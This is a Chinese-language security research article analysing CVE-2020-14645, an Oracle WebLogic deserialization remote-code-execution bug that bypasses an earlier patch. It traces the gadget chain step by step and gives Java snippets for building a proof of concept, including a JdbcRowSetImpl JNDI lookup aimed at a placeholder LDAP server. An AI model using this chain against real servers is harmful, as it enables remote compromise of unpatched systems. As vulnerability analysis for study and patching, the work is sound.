**作者：DEADF1SH_CAT@知道创宇404实验室  
时间：2020年8月3日**

## 前言

Oracle七月发布的安全更新中，包含了一个Weblogic的反序列化RCE漏洞，编号CVE-2020-14645，CVS评分9.8。

![image-20200801182009244](https://images.seebug.org/content/images/2020/08/03/1596424516000-image-20200801182009244.png-w331s)

该漏洞是针对于CVE-2020-2883的补丁绕过，CVE-2020-2883补丁将`MvelExtractor`和`ReflectionExtractor`列入黑名单，因此需要另外寻找一个存在`extract`且方法内存在恶意操作的类，这里用到的类为`com.tangosol.util.extractor.UniversalExtractor`,存在于Coherence组件。

## CVE-2020-2883

先来回顾一下CVE-2020-2883的两个poc调用链

    
    
    //poc1
     javax.management.BadAttributeValueExpException.readObject()
       com.tangosol.internal.sleepycat.persist.evolve.Mutations.toString()
         java.util.concurrent.ConcurrentSkipListMap$SubMap.size()
         java.util.concurrent.ConcurrentSkipListMap$SubMap.isBeforeEnd()
           java.util.concurrent.ConcurrentSkipListMap.cpr()
             com.tangosol.util.comparator.ExtractorComparator.compare()
               com.tangosol.util.extractor.ChainedExtractor.extract()
               com.tangosol.util.extractor.ReflectionExtractor().extract()
                 Method.invoke()
                 //...
               com.tangosol.util.extractor.ReflectionExtractor().extract()
                 Method.invoke()
                   Runtime.exec()
    
    //poc2
    java.util.PriorityQueue.readObject()
      java.util.PriorityQueue.heapify()
      java.util.PriorityQueue.siftDown()
      java.util.PriorityQueue.siftDownUsingComparator()
      com.tangosol.util.extractor.AbstractExtractor.compare()
        com.tangosol.util.extractor.MultiExtractor.extract()
          com.tangosol.util.extractor.ChainedExtractor.extract()
            //...
            Method.invoke()
                //...
              Runtime.exec()

其本质上，都是通过`ReflectionExtractor`调用任意方法，从而实现调用Runtime对象的exec方法执行任意命令，但补丁现在已经将`ReflectionExtractor`列入黑名单，那么只能使用`UniversalExtractor`重新构造一条利用链，这里使用poc2的入口即CommonsCollections4链的入口进行构造。

## CVE-2020-14645

为了方便一些纯萌新看懂，此处将会从0开始分析反序列化链（啰嗦模式警告），并且穿插一些poc构造时需要注意的点，先来看看调用栈。

![image-20200801234349005](https://images.seebug.org/content/images/2020/08/03/1596424520000-image-20200801234349005.png-w331s)

从头开始跟进分析整个利用链，先来看看`PriorityQueue.readObject()`方法。

![image-20200801234303677](https://images.seebug.org/content/images/2020/08/03/1596424520000-image-20200801234303677.png-w331s)

第792会执行for循环，将`s.readObject()`方法赋给`queue`对象数组,跟进`heapify()`方法。

![image-20200801234406139](https://images.seebug.org/content/images/2020/08/03/1596424520000-image-20200801234406139.png-w331s)

这里会取一半的queue数组分别执行`siftDown(i, (E)
queue[i]);`，实质上`PriorityQueue`是一个最小堆，这里通过`siftDown()`方法进行排序实现堆化，那么跟进`siftDown()`方法。

![image-20200801234425033](https://images.seebug.org/content/images/2020/08/03/1596424520000-image-20200801234425033.png-w331s)

这里有个对于`comparator`的判定，我们暂时不考虑`comparator`的值是什么，接下来会使用到，我们先跟进`siftDownUsingComparator()`方法。

![image-20200801234433087](https://images.seebug.org/content/images/2020/08/03/1596424520000-image-20200801234433087.png-w331s)

重点关注`comparator.compare()`方法，那么我们先来看看`comparator`是怎么来的。

![image-20200801234441593](https://images.seebug.org/content/images/2020/08/03/1596424520000-image-20200801234441593.png-w331s)

是在`PriorityQueue`的构造函数中被赋值的，并且这里可以看到，`queue`对象数组也是在这里被初始化的。那么结合上述所分析的点，我们需要构造一个长度为2的`queue`对象数组，才能触发排序，进入`siftDown()`方法。同时还要选择一个`comparator`，这里选用`ExtractorComparator`。继续跟进`ExtractorComparator.compare()`方法。

![image-20200801234503470](https://images.seebug.org/content/images/2020/08/03/1596424520000-image-20200801234503470.png-w331s)

这里将会调用`this.m_extractor.extract()`方法，让我们看看`this.m_extractor`是怎么来的。

![image-20200801221007825](https://images.seebug.org/content/images/2020/08/03/1596424520000-image-20200801221007825.png-w331s)

可以看到，`this.m_extractor`的值是与传入的`extractor`有关的。这里需要构造`this.m_extractor`为`ChainedExtractor`，才可以调用`ChainedExtractor`的`extract()`方法实现串接`extract()`调用。因此，首先需要构造这样一个`PriorityQueue`对象：

    
    
    PriorityQueue<Object> queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor));
    //这里chainedExtractor为ChainedExtractor对象，后续会说明chainedExtractor对象的具体构造

继续跟进`ChainedExtractor.extract()`方法，可以发现会遍历`aExtractor`数组，并调用其`extract()`方法。

![image-20200801234521152](https://images.seebug.org/content/images/2020/08/03/1596424520000-image-20200801234521152.png-w331s)

此处`aExtractor`数组是通过`ChainedExtractor`的父类`AbstractCompositeExtractor`的`getExtractors()`方法获取到父类的`m_aExtractor`属性值。

![image-20200801234540446](https://images.seebug.org/content/images/2020/08/03/1596424521000-image-20200801234540446.png-w331s)

所以，poc中需要这样构造`m_aExtractor`：

    
    
    Class clazz = ChainedExtractor.class.getSuperclass();
    Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
    m_aExtractor.setAccessible(true);

`m_aExtractor`具体的值需要怎么构造，需要我们继续往下分析。先回到我们所要利用到的`UniversalExtractor`，跟进其`extract()`方法。

![image-20200801234615723](https://images.seebug.org/content/images/2020/08/03/1596424521000-image-20200801234615723.png-w331s)

此处由于`m_cacheTarget`使用了`transient`修饰，无法被反序列化，因此只能执行else部分，跟进`extractComplex()`方法。

![image-20200801234732346](https://images.seebug.org/content/images/2020/08/03/1596424521000-image-20200801234732346.png-w331s)

这里看到最后有`method.invoke()`方法，`oTarget`和`aoParam`都是我们可控的，因此我们需要看看`method`的处理，跟进`findMethod`方法。

![image-20200801234829234](https://images.seebug.org/content/images/2020/08/03/1596424521000-image-20200801234829234.png-w331s)

可以看到第477行可以获取任意方法，但是要进入if语句，得先使`fExactMatch`为`true`，`fStatic`为`false`。可以看到`fStatic`是我们可控的，而`fExactMatch`默认为`true`，只要没进入for循环即可保持`true`不变，使`cParams`为空即`aclzParam`为空的Class数组即可，此处`aclzParam`从`getClassArray()`方法获取。

![image-20200801235221510](https://images.seebug.org/content/images/2020/08/03/1596424521000-image-20200801235221510.png-w331s)

显而易见，传入一个空的`Object[]`即可。回到`extractComplex()`方法，此时我们只要我们进入第192行的else语句中，即可调用任意类的任意方法。但此时还需要`fProperty`的值为`false`，跟进`isPropertyExtractor()`方法。

![image-20200801235942238](https://images.seebug.org/content/images/2020/08/03/1596424521000-image-20200801235942238.png-w331s)

可惜`m_fMethod`依旧是使用`transient`修饰，溯源`m_fMethod`的赋值过程。

![image-20200802000213645](https://images.seebug.org/content/images/2020/08/03/1596424521000-image-20200802000213645.png-w331s)

![image-20200802000409329](https://images.seebug.org/content/images/2020/08/03/1596424521000-image-20200802000409329.png-w331s)

![image-20200802000425863](https://images.seebug.org/content/images/2020/08/03/1596424521000-image-20200802000425863.png-w331s)

可以看到，由于this对象的原因，`getValueExtractorCanonicalName()`方法始终返回的是null，那么跟进`computeValuExtractorCanonicalName()`方法。

![image-20200802000543790](https://images.seebug.org/content/images/2020/08/03/1596424521000-image-20200802000543790.png-w331s)

此处不难理解，如果`aoParam`不为`null`且数组长度大于0就会返回`null`，因此我们调用的方法必须是无参的（因为`aoParam`必须为`null`）。接着如果方法名`sName`不以
() 结尾，则会直接返回方法名。否则会判断方法名是否以
`VALUE_EXTRACTOR_BEAN_ACCESSOR_PREFIXES`数组中的前缀开头，是的话就会截取掉并返回。

![image-20200802002321123](https://images.seebug.org/content/images/2020/08/03/1596424521000-image-20200802002321123.png-w331s)

回到`extractComplex`方法中，在if条件里会对上述返回的方法名做首字母大写处理，然后拼接`BEAN_ACCESSOR_PREFIXES`数组中的前缀，判断`clzTarget`类中是否含有拼接后的方法。这时发现无论如何我们都只能调用任意类中`get`和`is`开头的方法，并且还要是无参的。

![image-20200802005549067](https://images.seebug.org/content/images/2020/08/03/1596424521000-image-20200802005549067.png-w331s)

整理下我们可以利用的思路：

  * 调用`init()`方法，对`this.method`进行赋值，从而使`fProperty`的值为`false`，从而进入else分支语句，实现调用任意类的任意方法。然而这个思路马上就被终结了，因为我们根本调用不了非`get`和`is`开头的方法！！！

  * 被`transient`修饰的`m_cacheTarget`在`extractComplex`方法中被赋值

![image-20200802011653243](https://images.seebug.org/content/images/2020/08/03/1596424521000-image-20200802011653243.png-w331s)

在`ExtractorComparator.compare()`方法中，我们知道`extract`方法能被执行两次，因此在第二次执行时，能够在`UniversalExtractor.extract`方法中调用`targetPrev.getMethod().invoke(oTarget,
this.m_aoParam)`方法。但是这种方法也是行不通的，因为`getMethod()`获取的就是图上红框的中的`method`，很显然`method`依旧受到限制，当我们调用非
`get` 和 `is` 开头的方法时，`findMethod` 会返回 `null`。

  * 只能走方法被限制的路线了，寻找所有类中以 `get` 和 `is` 开头并且可利用的无参方法

复现过Fastjson反序列化漏洞的小伙伴，应该清楚Fastjson的利用链寻找主要针对`get`和`set`方法，这时候就与我们的需求有重合处，不难想到`JdbcRowSetImpl`的JNDI注入，接下来一起回顾一下。

![image-20200802012325020](https://images.seebug.org/content/images/2020/08/03/1596424521000-image-20200802012325020.png-w331s)

其`connect`方法中调用了`lookup`方法，并且`DataSourceName`是可控的，因此存在JNDI注入漏洞，看看有哪些地方调用了`connect`方法。

![image-20200802012358277](https://images.seebug.org/content/images/2020/08/03/1596424522000-image-20200802012358277.png-w331s)

有三个方法调用了`connect`方法，分别为`prepare`、`getDatabaseMetaData`和`setAutoCommit`方法，逐一分析。

  * **prepare()**

![image-20200802012523723](https://images.seebug.org/content/images/2020/08/03/1596424522000-image-20200802012523723.png-w331s)

一开始就调用了`connect`方法，继续回溯哪里调用了`prepare`方法。

![image-20200802012552220](https://images.seebug.org/content/images/2020/08/03/1596424522000-image-20200802012552220.png-w331s)

`execute`方法，应该是用于执行sql查询的

![image-20200802012907664](https://images.seebug.org/content/images/2020/08/03/1596424522000-image-20200802012907664.png-w331s)

这个应该是用于获取参数元数据的方法，`prepare()`方法应该都是用于一些与sql语句有关的操作方法中。

  * **getDatabaseMetaData()**

![image-20200802012946090](https://images.seebug.org/content/images/2020/08/03/1596424522000-image-20200802012946090.png-w331s)

  * **setAutoCommit()**

![image-20200802012958970](https://images.seebug.org/content/images/2020/08/03/1596424522000-image-20200802012958970.png-w331s)

必须让`this.conn`为空，对象初始化时默认为`null`，因此直接进入else语句。其实`this.conn`就是`connect`方法，用于保持数据库连接状态。

回到`connect`方法，我们需要进入else语句才能执行`lookup`方法。有两个前提条件，`this.conn`为空，也就是执行`connect`方法时是第一次执行。第二个条件是必须设置`DataSourceName`的值，跟进去该参数，发现为父类`BaseRowSet`的`private`属性，可被反序列化。

那么，对于WebLogic这个反序列化利用链，我们只要利用`getDatabaseMetaData()`方法就行，接下来看看该怎么一步步构造poc。先从`JdbcRowSetImpl`的JNDI注入回溯构造：

    
    
    JdbcRowSetImpl jdbcRowSet = (JdbcRowSetImpl)JdbcRowSetImpl.class.newInstance();
    Method setDataSource_Method = jdbcRowSet.getClass().getMethod("setDataSourceName", String.class);
    setDataSource_Method.invoke(jdbcRowSet,"ldap://xx.xx.xx.xx:1389/#Poc");//地址自行构造
    //利用ysoserial的Reflections模块,由于需要获取queue[i]进行compare，因此需要对数组进行赋值
    Object[] queueArray = (Object[])((Object[]) Reflections.getFieldValue(queue, "queue"));
    queueArray[0] = jdbcRowSet;
    queueArray[1] = jdbcRowSet;

接着构造`UniversalExtract`对象，用于调用`JdbcRowSetImpl`对象的方法

    
    
    UniversalExtractor universalExtractor = new UniversalExtractor();
    Object object = new Object[]{};
    Reflections.setFieldValue(universalExtractor,"m_aoParam",object);
    Reflections.setFieldValue(universalExtractor,"m_sName","DatabaseMetaData");
    Reflections.setFieldValue(universalExtractor,"m_fMethod",false);

紧接着将`UniversalExtract`对象装载进文章开头构造的`chainedExtractor`对象中

    
    
    ValueExtractor[] valueExtractor_list = new ValueExtractor[]{ universalExtractor };
    field.set(chainedExtractor,valueExtractor_list2);//field为m_aExtractor

此处，还有一个小点需注意，一个在文章开头部分构造的`PriorityQueue`对象，需要构造一个临时`Extractor`对象，用于创建时的`comparator`，此处以`ReflectionExtractor`为例。其次，`PriorityQueue`对象需要执行两次`add`方法。

    
    
    ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString",new Object[]{});
    ChainedExtractor chainedExtractor = new ChainedExtractor(new ValueExtractor[]{reflectionExtractor});
    PriorityQueue<Object> queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor));
    queue.add("1");
    queue.add("1");

回到`PriorityQueue`对象的`readObject`方法

![image-20200802022513752](https://images.seebug.org/content/images/2020/08/03/1596424522000-image-20200802022513752.png-w331s)

首先需要能进入for循环，for循环就得有`size`的值，`size`值默认为0，private属性，可以通过反射直接设置，但是不想通过反射怎么办，回溯赋值过程。

![image-20200802022659383](https://images.seebug.org/content/images/2020/08/03/1596424522000-image-20200802022659383.png-w331s)

在`offer`方法处获得赋值，而`offer`方法又是由`add`方法调用。（注意此处会执行`siftUp`方法，其中会触发comparator的`compare`方法，从而执行`extract`方法）。

![image-20200802023215593](https://images.seebug.org/content/images/2020/08/03/1596424522000-image-20200802023215593.png-w331s)

不难理解，每`add`一次，`size`加1，根据上述`heapify`方法，只会从开头开始取一半的`queue`数组执行`siftDown`方法。所以`size`至少为2，需要执行两次`add`方法，而不是`add(2)`一次。

至此，poc的主体就构造完成，其余部分就不在此阐述了，当然构造方式有很多，此处为方便萌新，分析得比较啰嗦，poc也比较杂乱，大家可以自行构造属于自己的poc。如果想要了解简洁高效的poc，可以参考一下Y4er师傅的poc[3]。

## 体会

初次接触完整的反序列化漏洞分析，在整个分析过程中收获到很多东西。笔者得到的不仅仅只是知识上的收获，在调试过程中也学到了很多调试技巧。另外本文看起来可能会比较啰嗦冗余，但其初衷是想要站在读者的角度去思考，去为了方便一些同样刚入门的人阅读起来，能够更加浅显易懂。学安全，我们经常会碰壁，对于一些知识会比较难啃。有些人遇到就选择了放弃，然后却因此原地踏步。不妨就这样迎难而上，咬着牙啃下去，到最后，你会发现，你得到的，远远比你付出的要多。可能对部分人不太有效、毕竟因人而异，但这是自己在学习过程中所体会到的，也因此想要分享给大家这么一个建议。相信在未来，自己对于反序列化漏洞的理解以及挖掘思路，能够有更深刻的认知，同时激发出自己不一样的思维碰撞。

## References

[1] Oracle 7月安全更新

<https://www.oracle.com/security-alerts/cpujul2020.html>

[2] T3反序列化 Weblogic12.2.1.4.0 JNDI注入

<https://mp.weixin.qq.com/s/8678EM15rZSeFBHGDfPvPQ>

[3] Y4er的poc

<https://github.com/Y4er/CVE-2020-14645>

[4] Java反序列化：基于CommonsCollections4的Gadget分析

<https://www.freebuf.com/articles/others-articles/193445.html>

[5] Oracle WebLogic 最新补丁的绕过漏洞分析（CVE-2020-2883）

<https://blog.csdn.net/systemino/article/details/106117659>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1280/>

